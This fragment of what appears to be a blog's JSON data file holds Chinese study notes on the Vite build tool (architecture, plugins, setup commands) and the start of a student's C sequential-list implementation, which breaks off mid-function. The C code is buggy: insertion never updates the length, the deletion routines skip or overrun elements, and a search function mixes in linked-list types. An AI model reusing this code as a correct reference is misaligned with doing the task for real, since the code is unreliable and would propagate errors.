2.代码压缩\n\n> Esbuild作为默认压缩工具，替换传统的Terser、Uglify.js等压缩工具；\n\n### 3.插件机制\n\n- 开发环境：模拟roolup插件机制\n- 生产环境：直接使用rollup\n\n## 五、Vite进阶路线\n\n### 1.深入双引擎\n\n- esbuild\n- rollupJS\n\n##### 学习\n\n- 查看官方文档\n- 先了解基本使用，动手尝试各项常用配置；\n- 学习其插件开发；\n\n### 2.插件机制\n\n- 易于抽离核心逻辑\n- 易于拓展\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/8ef80e5113384463.jpg)\n\n- config\n- resolveId\n- load\n- tranform\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/ad4af8b0fc78d654.jpg)\n\n### 3.学习\n\n- Vite插件开发文档；\n- 学习其他插件实现，json加载等；\n\n### 4.拆包（代码分割）\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/62c96b5942f5b559.jpg)\n\n### 5.JS编译工具（Babel）\n\n源代码->AST->AST->降级代码\n\n- AST为抽象语法树；\n\n### 6.语法安全降级\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/7bd9f45a3245d6e7.jpg)\n\n- 上层解决方案：plugin-legacy\n- 底层原理：借助babel实现；提前注入polyfill；\n\n### 7.服务端渲染（SSR）\n\n- 提升首屏性能\n- SEO优化；\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/c849fc3dd53d12c8.jpg)\n\n### 8.深入理解底层标准\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/5a034d64573a380a.jpg)\n\n","slug":"Vite知识体系","published":1,"updated":"2023-03-27T11:02:58.494Z","_id":"clg29vygj001yao9c1ymbf4hv","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Vite知识体系\"><a href=\"#Vite知识体系\" class=\"headerlink\" title=\"Vite知识体系\"></a>Vite知识体系</h1><h2 id=\"一、浅谈构建工具\"><a href=\"#一、浅谈构建工具\" class=\"headerlink\" title=\"一、浅谈构建工具\"></a>一、浅谈构建工具</h2><h3 id=\"1-Why-we-need-build-tools\"><a href=\"#1-Why-we-need-build-tools\" class=\"headerlink\" title=\"1. Why we need build tools?\"></a>1. Why we need build tools?</h3><ul>\n<li>模块化（ESM、CommonJS、UMD）</li>\n<li>资源编译（高级语法的编译）</li>\n<li>产物质量（代码提及、代码性能）</li>\n<li>开发效率（热更新）</li>\n</ul>\n<h3 id=\"2-构建工具的意义\"><a href=\"#2-构建工具的意义\" class=\"headerlink\" title=\"2.构建工具的意义\"></a>2.构建工具的意义</h3><ul>\n<li>提供模块加载方案、兼容不同的模块规范；</li>\n<li>高级语法转义（Sass，TS）、资源加载如图片、字体、worker；</li>\n<li>产物压缩、无用代码删除、语法降级；</li>\n<li>热更新；</li>\n</ul>\n<h3 id=\"3-Vite是什么？Why-vite？\"><a href=\"#3-Vite是什么？Why-vite？\" class=\"headerlink\" title=\"3.Vite是什么？Why vite？\"></a>3.Vite是什么？Why vite？</h3><h5 id=\"组成：\"><a href=\"#组成：\" class=\"headerlink\" title=\"组成：\"></a>组成：</h5><ul>\n<li>No-bundle开发服务、源文件无需打包；</li>\n<li>生产环境基于Rollup的Bundler；</li>\n</ul>\n<h5 id=\"核心特征：\"><a href=\"#核心特征：\" class=\"headerlink\" title=\"核心特征：\"></a>核心特征：</h5><ul>\n<li>高性能，dev启动速度和热更新速度非常快；</li>\n<li>简单易用，开发者体验好；</li>\n</ul>\n<h3 id=\"4-当下问题\"><a href=\"#4-当下问题\" class=\"headerlink\" title=\"4.当下问题\"></a>4.当下问题</h3><h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>缓慢启动；</li>\n<li>缓慢的热更新；</li>\n</ul>\n<h5 id=\"瓶颈\"><a href=\"#瓶颈\" class=\"headerlink\" title=\"瓶颈\"></a>瓶颈</h5><ul>\n<li>bundle带来的性能开销；</li>\n<li>JS语言的性能瓶颈；</li>\n</ul>\n<h5 id=\"行业趋势\"><a href=\"#行业趋势\" class=\"headerlink\" title=\"行业趋势\"></a>行业趋势</h5><ul>\n<li>全球浏览器对原生ESM的普遍支持；</li>\n</ul>\n<figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs crystal\"><span class=\"hljs-number\">1</span>.script标签增加<span class=\"hljs-keyword\">type</span>=“<span class=\"hljs-class\"><span class=\"hljs-keyword\">module</span>”属性；</span><br><span class=\"hljs-number\">2</span>.使用ESM模块导入导出语法；<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/954d53ed35dab73a.jpg\"></p>\n<ul>\n<li>基于原生语言（Go、Rust）编写前端编译工具链；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/a162a7181e2b1488.jpg\"></p>\n<h2 id=\"二、Vite概要\"><a href=\"#二、Vite概要\" class=\"headerlink\" title=\"二、Vite概要\"></a>二、Vite概要</h2><h3 id=\"1-内置Web构建功能\"><a href=\"#1-内置Web构建功能\" class=\"headerlink\" title=\"1.内置Web构建功能\"></a>1.内置Web构建功能</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/b6130def732894e1.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/5766272cb741272e.jpg\"></p>\n<h2 id=\"三、Vite上手\"><a href=\"#三、Vite上手\" class=\"headerlink\" title=\"三、Vite上手\"></a>三、Vite上手</h2><h3 id=\"1-项目初始化\"><a href=\"#1-项目初始化\" class=\"headerlink\" title=\"1.项目初始化\"></a>1.项目初始化</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">提前安装pnpm</span><br>npm i -g pnpm<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">初始化命令</span><br>pnpm create vite<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">安装依赖</span><br>pnpm install<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">启动项目</span><br>npm run dev<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">安装sass</span><br>pnpm install sass -D<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">打包</span><br>tsc &amp;&amp; vite build<br><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight tsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs tsx\"><span class=\"hljs-keyword\">import</span> * <span class=\"hljs-keyword\">as</span> <span class=\"hljs-title class_\">React</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;react&#x27;</span>;<br><span class=\"hljs-keyword\">import</span> &#123; <span class=\"hljs-title class_\">Component</span> &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;react&#x27;</span>;<br><span class=\"hljs-keyword\">import</span> styles <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;./index.module.scss&#x27;</span>;<br><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Header</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> (<br>        <span class=\"language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h1</span> <span class=\"hljs-attr\">className</span>=<span class=\"hljs-string\">&#123;styles.header&#125;</span>&gt;</span>Header<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h1</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br>    )<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-selector-class\">.header</span>&#123;<br>    <span class=\"hljs-attribute\">color</span>:red;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-无需额外配置\"><a href=\"#2-无需额外配置\" class=\"headerlink\" title=\"2.无需额外配置\"></a>2.无需额外配置</h3><blockquote>\n<p>可以保存组件状态：修改A组件代码时，Web热更新之后，不会影响其他组件的状态；</p>\n</blockquote>\n<h3 id=\"3-Tree-Shaking\"><a href=\"#3-Tree-Shaking\" class=\"headerlink\" title=\"3.Tree Shaking\"></a>3.Tree Shaking</h3><h5 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h5><ul>\n<li>基于ESM的import/export语句依赖关系，与实时状态无关；</li>\n<li>在构建阶段将未使用到的代码进行删除；</li>\n<li>Tree shaking 在vite中无需配置，默认开启；</li>\n</ul>\n<h3 id=\"4-优点\"><a href=\"#4-优点\" class=\"headerlink\" title=\"4.优点\"></a>4.优点</h3><ul>\n<li>响应迅速</li>\n<li>开箱即用</li>\n</ul>\n<h2 id=\"四、Vite整体架构\"><a href=\"#四、Vite整体架构\" class=\"headerlink\" title=\"四、Vite整体架构\"></a>四、Vite整体架构</h2><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/9290159fce29e6d4.jpg\"></p>\n<h3 id=\"1-单文件编译\"><a href=\"#1-单文件编译\" class=\"headerlink\" title=\"1.单文件编译\"></a>1.单文件编译</h3><blockquote>\n<p>使用Esbuild编译TS/TSX；</p>\n<p>预打包：扫描代码进行预先打包；</p>\n</blockquote>\n<h5 id=\"优势\"><a href=\"#优势\" class=\"headerlink\" title=\"优势\"></a>优势</h5><ul>\n<li>编译速度提升10-100X</li>\n</ul>\n<h5 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h5><ul>\n<li>不支持类型检查；（运行之前需要调用<code>tsc</code>）</li>\n<li>不支持语法降级到ES5；</li>\n</ul>\n<h3 id=\"2-代码压缩\"><a href=\"#2-代码压缩\" class=\"headerlink\" title=\"2.代码压缩\"></a>2.代码压缩</h3><blockquote>\n<p>Esbuild作为默认压缩工具，替换传统的Terser、Uglify.js等压缩工具；</p>\n</blockquote>\n<h3 id=\"3-插件机制\"><a href=\"#3-插件机制\" class=\"headerlink\" title=\"3.插件机制\"></a>3.插件机制</h3><ul>\n<li>开发环境：模拟roolup插件机制</li>\n<li>生产环境：直接使用rollup</li>\n</ul>\n<h2 id=\"五、Vite进阶路线\"><a href=\"#五、Vite进阶路线\" class=\"headerlink\" title=\"五、Vite进阶路线\"></a>五、Vite进阶路线</h2><h3 id=\"1-深入双引擎\"><a href=\"#1-深入双引擎\" class=\"headerlink\" title=\"1.深入双引擎\"></a>1.深入双引擎</h3><ul>\n<li>esbuild</li>\n<li>rollupJS</li>\n</ul>\n<h5 id=\"学习\"><a href=\"#学习\" class=\"headerlink\" title=\"学习\"></a>学习</h5><ul>\n<li>查看官方文档</li>\n<li>先了解基本使用，动手尝试各项常用配置；</li>\n<li>学习其插件开发；</li>\n</ul>\n<h3 id=\"2-插件机制\"><a href=\"#2-插件机制\" class=\"headerlink\" title=\"2.插件机制\"></a>2.插件机制</h3><ul>\n<li>易于抽离核心逻辑</li>\n<li>易于拓展</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/8ef80e5113384463.jpg\"></p>\n<ul>\n<li>config</li>\n<li>resolveId</li>\n<li>load</li>\n<li>tranform</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/ad4af8b0fc78d654.jpg\"></p>\n<h3 id=\"3-学习\"><a href=\"#3-学习\" class=\"headerlink\" title=\"3.学习\"></a>3.学习</h3><ul>\n<li>Vite插件开发文档；</li>\n<li>学习其他插件实现，json加载等；</li>\n</ul>\n<h3 id=\"4-拆包（代码分割）\"><a href=\"#4-拆包（代码分割）\" class=\"headerlink\" title=\"4.拆包（代码分割）\"></a>4.拆包（代码分割）</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/62c96b5942f5b559.jpg\"></p>\n<h3 id=\"5-JS编译工具（Babel）\"><a href=\"#5-JS编译工具（Babel）\" class=\"headerlink\" title=\"5.JS编译工具（Babel）\"></a>5.JS编译工具（Babel）</h3><p>源代码-&gt;AST-&gt;AST-&gt;降级代码</p>\n<ul>\n<li>AST为抽象语法树；</li>\n</ul>\n<h3 id=\"6-语法安全降级\"><a href=\"#6-语法安全降级\" class=\"headerlink\" title=\"6.语法安全降级\"></a>6.语法安全降级</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/7bd9f45a3245d6e7.jpg\"></p>\n<ul>\n<li>上层解决方案：plugin-legacy</li>\n<li>底层原理：借助babel实现；提前注入polyfill；</li>\n</ul>\n<h3 id=\"7-服务端渲染（SSR）\"><a href=\"#7-服务端渲染（SSR）\" class=\"headerlink\" title=\"7.服务端渲染（SSR）\"></a>7.服务端渲染（SSR）</h3><ul>\n<li>提升首屏性能</li>\n<li>SEO优化；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/c849fc3dd53d12c8.jpg\"></p>\n<h3 id=\"8-深入理解底层标准\"><a href=\"#8-深入理解底层标准\" class=\"headerlink\" title=\"8.深入理解底层标准\"></a>8.深入理解底层标准</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/5a034d64573a380a.jpg\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Vite知识体系\"><a href=\"#Vite知识体系\" class=\"headerlink\" title=\"Vite知识体系\"></a>Vite知识体系</h1><h2 id=\"一、浅谈构建工具\"><a href=\"#一、浅谈构建工具\" class=\"headerlink\" title=\"一、浅谈构建工具\"></a>一、浅谈构建工具</h2><h3 id=\"1-Why-we-need-build-tools\"><a href=\"#1-Why-we-need-build-tools\" class=\"headerlink\" title=\"1. Why we need build tools?\"></a>1. Why we need build tools?</h3><ul>\n<li>模块化（ESM、CommonJS、UMD）</li>\n<li>资源编译（高级语法的编译）</li>\n<li>产物质量（代码提及、代码性能）</li>\n<li>开发效率（热更新）</li>\n</ul>\n<h3 id=\"2-构建工具的意义\"><a href=\"#2-构建工具的意义\" class=\"headerlink\" title=\"2.构建工具的意义\"></a>2.构建工具的意义</h3><ul>\n<li>提供模块加载方案、兼容不同的模块规范；</li>\n<li>高级语法转义（Sass，TS）、资源加载如图片、字体、worker；</li>\n<li>产物压缩、无用代码删除、语法降级；</li>\n<li>热更新；</li>\n</ul>\n<h3 id=\"3-Vite是什么？Why-vite？\"><a href=\"#3-Vite是什么？Why-vite？\" class=\"headerlink\" title=\"3.Vite是什么？Why vite？\"></a>3.Vite是什么？Why vite？</h3><h5 id=\"组成：\"><a href=\"#组成：\" class=\"headerlink\" title=\"组成：\"></a>组成：</h5><ul>\n<li>No-bundle开发服务、源文件无需打包；</li>\n<li>生产环境基于Rollup的Bundler；</li>\n</ul>\n<h5 id=\"核心特征：\"><a href=\"#核心特征：\" class=\"headerlink\" title=\"核心特征：\"></a>核心特征：</h5><ul>\n<li>高性能，dev启动速度和热更新速度非常快；</li>\n<li>简单易用，开发者体验好；</li>\n</ul>\n<h3 id=\"4-当下问题\"><a href=\"#4-当下问题\" class=\"headerlink\" title=\"4.当下问题\"></a>4.当下问题</h3><h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>缓慢启动；</li>\n<li>缓慢的热更新；</li>\n</ul>\n<h5 id=\"瓶颈\"><a href=\"#瓶颈\" class=\"headerlink\" title=\"瓶颈\"></a>瓶颈</h5><ul>\n<li>bundle带来的性能开销；</li>\n<li>JS语言的性能瓶颈；</li>\n</ul>\n<h5 id=\"行业趋势\"><a href=\"#行业趋势\" class=\"headerlink\" title=\"行业趋势\"></a>行业趋势</h5><ul>\n<li>全球浏览器对原生ESM的普遍支持；</li>\n</ul>\n<figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs crystal\"><span class=\"hljs-number\">1</span>.script标签增加<span class=\"hljs-keyword\">type</span>=“<span class=\"hljs-class\"><span class=\"hljs-keyword\">module</span>”属性；</span><br><span class=\"hljs-number\">2</span>.使用ESM模块导入导出语法；<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/954d53ed35dab73a.jpg\"></p>\n<ul>\n<li>基于原生语言（Go、Rust）编写前端编译工具链；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/a162a7181e2b1488.jpg\"></p>\n<h2 id=\"二、Vite概要\"><a href=\"#二、Vite概要\" class=\"headerlink\" title=\"二、Vite概要\"></a>二、Vite概要</h2><h3 id=\"1-内置Web构建功能\"><a href=\"#1-内置Web构建功能\" class=\"headerlink\" title=\"1.内置Web构建功能\"></a>1.内置Web构建功能</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/b6130def732894e1.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/5766272cb741272e.jpg\"></p>\n<h2 id=\"三、Vite上手\"><a href=\"#三、Vite上手\" class=\"headerlink\" title=\"三、Vite上手\"></a>三、Vite上手</h2><h3 id=\"1-项目初始化\"><a href=\"#1-项目初始化\" class=\"headerlink\" title=\"1.项目初始化\"></a>1.项目初始化</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">提前安装pnpm</span><br>npm i -g pnpm<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">初始化命令</span><br>pnpm create vite<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">安装依赖</span><br>pnpm install<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">启动项目</span><br>npm run dev<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">安装sass</span><br>pnpm install sass -D<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">打包</span><br>tsc &amp;&amp; vite build<br><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight tsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs tsx\"><span class=\"hljs-keyword\">import</span> * <span class=\"hljs-keyword\">as</span> <span class=\"hljs-title class_\">React</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;react&#x27;</span>;<br><span class=\"hljs-keyword\">import</span> &#123; <span class=\"hljs-title class_\">Component</span> &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;react&#x27;</span>;<br><span class=\"hljs-keyword\">import</span> styles <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;./index.module.scss&#x27;</span>;<br><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Header</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> (<br>        <span class=\"language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h1</span> <span class=\"hljs-attr\">className</span>=<span class=\"hljs-string\">&#123;styles.header&#125;</span>&gt;</span>Header<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h1</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br>    )<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-selector-class\">.header</span>&#123;<br>    <span class=\"hljs-attribute\">color</span>:red;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-无需额外配置\"><a href=\"#2-无需额外配置\" class=\"headerlink\" title=\"2.无需额外配置\"></a>2.无需额外配置</h3><blockquote>\n<p>可以保存组件状态：修改A组件代码时，Web热更新之后，不会影响其他组件的状态；</p>\n</blockquote>\n<h3 id=\"3-Tree-Shaking\"><a href=\"#3-Tree-Shaking\" class=\"headerlink\" title=\"3.Tree Shaking\"></a>3.Tree Shaking</h3><h5 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h5><ul>\n<li>基于ESM的import/export语句依赖关系，与实时状态无关；</li>\n<li>在构建阶段将未使用到的代码进行删除；</li>\n<li>Tree shaking 在vite中无需配置，默认开启；</li>\n</ul>\n<h3 id=\"4-优点\"><a href=\"#4-优点\" class=\"headerlink\" title=\"4.优点\"></a>4.优点</h3><ul>\n<li>响应迅速</li>\n<li>开箱即用</li>\n</ul>\n<h2 id=\"四、Vite整体架构\"><a href=\"#四、Vite整体架构\" class=\"headerlink\" title=\"四、Vite整体架构\"></a>四、Vite整体架构</h2><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/9290159fce29e6d4.jpg\"></p>\n<h3 id=\"1-单文件编译\"><a href=\"#1-单文件编译\" class=\"headerlink\" title=\"1.单文件编译\"></a>1.单文件编译</h3><blockquote>\n<p>使用Esbuild编译TS/TSX；</p>\n<p>预打包：扫描代码进行预先打包；</p>\n</blockquote>\n<h5 id=\"优势\"><a href=\"#优势\" class=\"headerlink\" title=\"优势\"></a>优势</h5><ul>\n<li>编译速度提升10-100X</li>\n</ul>\n<h5 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h5><ul>\n<li>不支持类型检查；（运行之前需要调用<code>tsc</code>）</li>\n<li>不支持语法降级到ES5；</li>\n</ul>\n<h3 id=\"2-代码压缩\"><a href=\"#2-代码压缩\" class=\"headerlink\" title=\"2.代码压缩\"></a>2.代码压缩</h3><blockquote>\n<p>Esbuild作为默认压缩工具，替换传统的Terser、Uglify.js等压缩工具；</p>\n</blockquote>\n<h3 id=\"3-插件机制\"><a href=\"#3-插件机制\" class=\"headerlink\" title=\"3.插件机制\"></a>3.插件机制</h3><ul>\n<li>开发环境：模拟roolup插件机制</li>\n<li>生产环境：直接使用rollup</li>\n</ul>\n<h2 id=\"五、Vite进阶路线\"><a href=\"#五、Vite进阶路线\" class=\"headerlink\" title=\"五、Vite进阶路线\"></a>五、Vite进阶路线</h2><h3 id=\"1-深入双引擎\"><a href=\"#1-深入双引擎\" class=\"headerlink\" title=\"1.深入双引擎\"></a>1.深入双引擎</h3><ul>\n<li>esbuild</li>\n<li>rollupJS</li>\n</ul>\n<h5 id=\"学习\"><a href=\"#学习\" class=\"headerlink\" title=\"学习\"></a>学习</h5><ul>\n<li>查看官方文档</li>\n<li>先了解基本使用，动手尝试各项常用配置；</li>\n<li>学习其插件开发；</li>\n</ul>\n<h3 id=\"2-插件机制\"><a href=\"#2-插件机制\" class=\"headerlink\" title=\"2.插件机制\"></a>2.插件机制</h3><ul>\n<li>易于抽离核心逻辑</li>\n<li>易于拓展</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/8ef80e5113384463.jpg\"></p>\n<ul>\n<li>config</li>\n<li>resolveId</li>\n<li>load</li>\n<li>tranform</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/ad4af8b0fc78d654.jpg\"></p>\n<h3 id=\"3-学习\"><a href=\"#3-学习\" class=\"headerlink\" title=\"3.学习\"></a>3.学习</h3><ul>\n<li>Vite插件开发文档；</li>\n<li>学习其他插件实现，json加载等；</li>\n</ul>\n<h3 id=\"4-拆包（代码分割）\"><a href=\"#4-拆包（代码分割）\" class=\"headerlink\" title=\"4.拆包（代码分割）\"></a>4.拆包（代码分割）</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/62c96b5942f5b559.jpg\"></p>\n<h3 id=\"5-JS编译工具（Babel）\"><a href=\"#5-JS编译工具（Babel）\" class=\"headerlink\" title=\"5.JS编译工具（Babel）\"></a>5.JS编译工具（Babel）</h3><p>源代码-&gt;AST-&gt;AST-&gt;降级代码</p>\n<ul>\n<li>AST为抽象语法树；</li>\n</ul>\n<h3 id=\"6-语法安全降级\"><a href=\"#6-语法安全降级\" class=\"headerlink\" title=\"6.语法安全降级\"></a>6.语法安全降级</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/7bd9f45a3245d6e7.jpg\"></p>\n<ul>\n<li>上层解决方案：plugin-legacy</li>\n<li>底层原理：借助babel实现；提前注入polyfill；</li>\n</ul>\n<h3 id=\"7-服务端渲染（SSR）\"><a href=\"#7-服务端渲染（SSR）\" class=\"headerlink\" title=\"7.服务端渲染（SSR）\"></a>7.服务端渲染（SSR）</h3><ul>\n<li>提升首屏性能</li>\n<li>SEO优化；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/c849fc3dd53d12c8.jpg\"></p>\n<h3 id=\"8-深入理解底层标准\"><a href=\"#8-深入理解底层标准\" class=\"headerlink\" title=\"8.深入理解底层标准\"></a>8.深入理解底层标准</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/5a034d64573a380a.jpg\"></p>\n"},{"title":"顺序表","date":"2021-08-08T12:57:45.000Z","mp3":null,"cover":"img/bg1.jpg","_content":"\nCH1 顺序表基本操作及实现（C）\n\n```csharp\n#include<stdio.h>\n#include<stdlib.h>\n\n#define MAXSIZE 50\n#define Elemtype int \n\ntypedef struct{\n    Elemtype data[MAXSIZE];\n    int length;\n}Sqlist;\n\nvoid InitSqlist(Sqlist *L)\n{\n    L->length=0;\n    printf(\"Init the list successfully!\\n\");\n    return;\n}\n\nvoid CreateSqlist(Sqlist *L,int temp_data[],int temp_length)\n{\n    if(temp_length>MAXSIZE)\n    {\n        printf(\"Overflow!\\n\");\n        return;\n    }\n\n    for(int index=0;index<temp_length;index++)\n    {\n        L->data[index]=temp_data[index];\n    }\n    L->length=temp_length;\n    printf(\"Create the table successfully!\\n\");\n    return;\n}\n\nvoid InsertList(Sqlist *L,Elemtype newData,int temp_position)\n{\n    if(temp_position<0||temp_position>L->length+1)\n    {\n        printf(\"Wrong position!\\n\");\n        return;\n    }\n    else\n    {\n        for(int index=L->length;index>temp_position;index--)\n        {\n            L->data[index]=L->data[index-1];\n        }\n        L->data[temp_position]=newData;\n        printf(\"Add new data successfully!\\n\");\n        return;\n    }\n}\n\nvoid DeleteDataByElement(Sqlist *L,Elemtype deletedData)\n{\n    int counter=0;\n    for(int index=0;index<L->length-1;index++)\n    {\n        if(L->data[index]==deletedData)\n        {\n            counter+=1;\n            for(int index1=index;index1<L->length-1;index1++)\n            {\n                L->data[index1]=L->data[index1+1];\n            }\n        }\n    }\n    L->length-=counter;\n    printf(\"The counter is %d\\n\",counter);\n    printf(\"Delete the data successfully!\\n\");\n    return;\n}\n\nvoid DeleteDataByPosition(Sqlist *L,int tempDeletePosition)\n{\n    Elemtype deleted_data;\n    if(tempDeletePosition<0||tempDeletePosition>L->length)\n    {\n        printf(\"Wrong position!\\n\");\n    }\n    else{\n        deleted_data=L->data[tempDeletePosition];\n        for(int index=tempDeletePosition;index<L->length;index++)\n        {\n\n            L->data[index]=L->data[index+1];\n        }\n        L->length--;\n    }\n    printf(\"Delete the data successfully!\\n\");\n    printf(\"The deleted data is %d\\n\",deleted_data);\n    return;\n}\n\n//按值查找\nint Locate_Data(Linklist L,ElemType targetData)\n{\n    LNode *p;\n    p=L->next;\n    int index=0;\n    while(p)\n    {\n        